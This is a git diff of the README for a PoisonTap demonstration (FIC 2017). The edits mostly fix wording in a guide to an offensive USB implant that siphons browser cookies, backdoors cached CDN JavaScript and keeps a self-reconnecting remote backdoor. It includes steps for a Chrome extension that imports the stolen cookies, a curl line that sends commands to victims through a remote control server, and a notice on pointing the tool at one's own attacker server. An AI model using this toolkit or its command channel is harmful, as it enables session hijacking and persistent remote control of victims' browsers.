@@ -1,23 +1,24 @@
 # Demonstration of PoisonTap - FIC 2017
 
-PoisonTap exploit created by Samy Kamkar
-Chrome extension for PoisonTap Cookie created by Pandhack & drouarb
+*PoisonTap exploit created by Samy Kamkar*
 
-What we have done in addition to Samy kamkar work :
-* Modified *pi_poisontap.js* to generate a file *cookies.json* with a corect json syntax
-* Modified *backdoor.html* to permit the backdoor to reconnect itself automaticaly
-* Developped a *chrome extension* to import siphoned cookies
+*Chrome extension for PoisonTap Cookie created by Pandhack & drouarb*
 
-# ChromeExtension : Installation
+What we have done in addition to Samy Kamkar's work :
+* Modified *pi_poisontap.js* to generate a file *cookies.json* with a correct json syntax
+* Modified *backdoor.html* to allow the backdoor to reconnect itself automatically
+* Developed a *chrome extension* to import siphoned cookies
+
+## ChromeExtension : Installation
 
 * Download Google Chrome
-* tap ```bashchrome://extensions/``` in the url bar
-* Active "Developer Mode"
-* Click on Load unpacked extension & select our chrome_extension folder
+* Enter `chrome://extensions/` in the url bar
+* Active `Developer Mode`
+* Click on `Load unpacked extension` & select our `chrome_extension` folder
 
-# PoisonTap : Installation / File Breakdown
+## PoisonTap : Installation / File Breakdown
 
-**This section is an extract of Samy Kambar poisontap repository, if you want to read the entirely explanation go to <a href="https://github.com/samyk/poisontap" target=_blank>https://github.com/samyk/poisontap</a>**
+*This section is an extract of Samy Kambar poisontap repository, you can read the full explanation on <a href="https://github.com/samyk/poisontap" target=_blank>https://github.com/samyk/poisontap</a>*
 
 Note: If you find the device is NOT acting as an Ethernet controller automatically (older versions of Windows, for example), you can [change the VID and PID in pi_startup.sh](https://github.com/samyk/poisontap/issues/8#issuecomment-265818957)
 
@@ -59,5 +60,7 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 * **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
 * **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
 * **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.
-* **cookies.json** - Like *poisontap.cookies.log* it is a cookies log file but with a correct json format. Don't forget to add "[" at the begining of the file and a "]" at the end before import the file in the chrome extension
+* **cookies.json** - Like *poisontap.cookies.log* it is a cookies log file but with a correct json format. Don't forget to add "[" at the begining of the file and a "]" at the end before importing the file in the chrome extension.
 
+
+**NOTICE :** *You can change `samy.pl:1337` by your server's IP address with the backend.js script running*
